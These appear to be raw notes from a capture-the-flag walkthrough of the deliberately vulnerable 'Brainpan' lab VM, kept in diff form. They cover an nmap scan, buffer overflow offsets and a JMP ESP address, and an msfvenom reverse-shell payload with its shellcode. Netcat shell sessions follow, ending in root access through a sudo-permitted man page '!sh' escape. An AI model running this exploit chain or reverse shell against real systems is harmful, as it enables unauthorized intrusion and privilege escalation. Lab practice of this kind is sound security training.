@@ -1,0 +1,194 @@
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-30 13:16 CDT
+Nmap scan report for 192.168.56.101
+Host is up (0.00068s latency).
+Not shown: 998 closed ports
+PORT      STATE SERVICE VERSION
+9999/tcp  open  abyss?
+| fingerprint-strings: 
+|   NULL: 
+|     _| _| 
+|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
+|     _|_| _| _| _| _| _| _| _| _| _| _| _|
+|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
+|     [________________________ WELCOME TO BRAINPAN _________________________]
+|_    ENTER THE PASSWORD
+10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
+|_http-title: Site doesn't have a title (text/html).
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9999-TCP:V=7.70%I=7%D=5/30%Time=5B0EEAA0%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|
+SF:\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\
+SF:x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x
+SF:20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x
+SF:20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x
+SF:20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|
+SF:\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x
+SF:20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x
+SF:20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x
+SF:20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_
+SF:\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x
+SF:20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x
+SF:20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x
+SF:20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");
+MAC Address: 08:00:27:09:22:ED (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.10
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.68 ms 192.168.56.101
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 61.84 seconds
+
+dirbuster found:
+
+http://192.168.56.101:10000/bin/
+
+found brainpan.exe, load into windows xp, expects a connection to port 9999....
+
+plan:
+
+break with immunity on windows debug machine, find password, port to linux, exploit on port 9999 on brainpan server
+
+btw, password seems to be "shitstorm", found with strings
+
+we can cause a crash with 3000 A's after "shitstorm"
+
+root@kali:~/vulnhub/brainpan# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 35724134
+[*] Exact match at offset 524
+
+so:
+
+must have a newline to pass the check
+
+junk = 'A' * 523 + '\n'
+buffer =  junk + '\x42\x42\x42\x42' + ((900 - 524 - 4) * 'C') 
+
+make shell, yada yada. badchars are 0x00, 0x0a, 0x0d. JMP ESP is in brainpan.exe itself:
+
+jmpesp = '\xf3\x12\x17\x31'
+
+
+root@kali:~/vulnhub/brainpan# nc -nvlp 21865
+listening on [any] 21865 ...
+connect to [192.168.56.103] from (UNKNOWN) [192.168.56.102] 1042
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\Documents and Settings\test\Desktop>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection:
+
+        Connection-specific DNS Suffix  . : 
+        IP Address. . . . . . . . . . . . : 192.168.56.102
+        Subnet Mask . . . . . . . . . . . : 255.255.255.0
+        Default Gateway . . . . . . . . . : 
+
+C:\Documents and Settings\test\Desktop>
+
+modify for linux:
+
+root@kali:~/vulnhub/brainpan# msfvenom -p linux/x86/shell_reverse_tcp -b '\x00\x0a\x0d' LHOST=192.168.56.103 LPORT=21865 -e x86/shikata_ga_nai -f python
+No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+No Arch selected, selecting Arch: x86 from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 95 (iteration=0)
+x86/shikata_ga_nai chosen with final size 95
+Payload size: 95 bytes
+Final size of python file: 470 bytes
+buf =  ""
+buf += "\xbf\xb3\xa5\x27\xc2\xda\xd1\xd9\x74\x24\xf4\x58\x31"
+buf += "\xc9\xb1\x12\x83\xe8\xfc\x31\x78\x0e\x03\xcb\xab\xc5"
+buf += "\x37\x1a\x6f\xfe\x5b\x0f\xcc\x52\xf6\xad\x5b\xb5\xb6"
+buf += "\xd7\x96\xb6\x24\x4e\x99\x88\x87\xf0\x90\x8f\xee\x98"
+buf += "\xe2\xd8\x29\x3f\x8b\x1a\x4a\xea\x22\x92\xab\xa4\xd3"
+buf += "\xf4\x7a\x97\xa8\xf6\xf5\xf6\x02\x78\x57\x90\xf2\x56"
+buf += "\x2b\x08\x63\x86\xe4\xaa\x1a\x51\x19\x78\x8e\xe8\x3f"
+buf += "\xcc\x3b\x26\x3f"
+
+
+root@kali:~/vulnhub/brainpan# nc -nvlp 21865
+listening on [any] 21865 ...
+connect to [192.168.56.103] from (UNKNOWN) [192.168.56.101] 44190
+id
+uid=1002(puck) gid=1002(puck) groups=1002(puck)
+python -c "import pty; pty.spawn('/bin/bash')"
+puck@brainpan:/home/puck$
+
+puck@brainpan:/home$ sudo -l
+sudo -l
+Matching Defaults entries for puck on this host:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User puck may run the following commands on this host:
+    (root) NOPASSWD: /home/anansi/bin/anansi_util
+puck@brainpan:/home$ 
+
+
+
+puck@brainpan:/home$ sudo /home/anansi/bin/anansi_util manual nano
+sudo /home/anansi/bin/anansi_util manual nano
+No manual entry for manual
+WARNING: terminal is not fully functional
+-  (press RETURN)
+NANO(1)                                                                NANO(1)
+
+NAME
+       nano - Nano's ANOther editor, an enhanced free Pico clone
+
+SYNOPSIS
+       nano [OPTIONS] [[+LINE,COLUMN] FILE]...
+
+DESCRIPTION
+       This manual page briefly documents the nano command.
+
+       nano  is  a small, free and friendly editor which aims to replace Pico,
+       the default editor included in the non-free Pine package.  Rather  than
+       just  copying  Pico's  look and feel, nano also implements some missing
+       (or disabled by default) features in Pico, such as "search and replace"
+       and "go to line and column number".
+
+OPTIONS
+       +LINE,COLUMN
+              Places  cursor  at line number LINE and column number COLUMN (at
+              least one of which must be specified) on startup, instead of the
+              default of line 1, column 1.
+
+ Manual page nano(1) line 1 (press h for help or q to quit)!sh
+!sh
+# id && hostname
+id && hostname
+uid=0(root) gid=0(root) groups=0(root)
+brainpan
+#
+
+
+
+
+
+
